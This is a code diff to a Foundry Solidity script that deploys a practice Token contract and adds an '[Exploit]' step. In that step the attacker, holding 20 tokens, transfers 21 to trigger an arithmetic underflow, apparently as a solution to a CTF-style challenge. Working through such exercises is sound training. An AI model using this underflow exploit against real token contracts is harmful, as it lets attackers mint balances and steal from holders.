@@ -20,7 +20,7 @@ contract TokenScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = Token(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = Token(0x0000000000000000000000000000000000000000); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -32,7 +32,8 @@ contract TokenScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new Token();
+            target = new Token(10 ether + 20);
+            target.transfer(attacker, 20);
             vm.stopBroadcast();
         }
     }
@@ -44,5 +45,12 @@ contract TokenScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+        console.log("token.balance[attacker] : %s", target.balanceOf(attacker));
+
+        console.log("[Exploit]");
+        address tmp = address(1337);
+        vm.broadcast(attacker);
+        target.transfer(tmp, 21);
+        console.log("token.balance[attacker] : %s", target.balanceOf(attacker));
     }
 }
